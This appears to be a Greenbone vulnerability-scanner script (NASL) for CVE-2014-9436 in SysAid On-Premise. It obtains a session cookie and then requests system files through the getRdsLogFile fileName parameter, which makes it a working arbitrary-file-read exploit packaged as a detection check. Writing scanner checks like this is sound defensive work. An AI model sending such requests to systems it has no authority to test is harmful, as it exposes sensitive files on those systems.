# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sysaid:sysaid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105938");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-01-13 16:45:50 +0700 (Tue, 13 Jan 2015)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2014-9436");

  script_name("SysAid < 14.4.2 Arbitrary File Disclosure Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_sysaid_help_desk_http_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("sysaid/http/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35593/");

  script_tag(name:"summary", value:"SysAid On-Premise is prone to an arbitrary file disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"SysAid On-Premise is vulnerable to an unauthenticated file
  disclosure attack in the fileName parameter of getRdsLogFile.");

  script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary files which may
  contain sensitive information.");

  script_tag(name:"affected", value:"SysAid On-Premise before 14.4.2.");

  script_tag(name:"solution", value:"Update to version 14.4.2 or above.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

req = http_get(item:string(dir, "/Login.jsp"), port:port);
res = http_keepalive_send_recv(port:port, data:req);

sessionid = eregmatch(string:res, pattern:"JSESSIONID=([^;]+)");
if (isnull(sessionid[1]))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port: port);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + '/getRdsLogFile?fileName=/' + file;
  req = 'GET ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n' +
        'Accept-Encoding: gzip, deflate\r\n' +
        'Cookie: JSESSIONID=' + sessionid[1] + '\r\n' +
        'Connection: keep-alive\r\n\r\n';

  res = http_keepalive_send_recv(port:port, data:req);

  if (res && egrep(string:res, pattern:pattern)) {
    report = http_report_vuln_url(url:url, port:port);
    security_message(data:report, port:port);
    exit(0);
  }
}

exit(99);
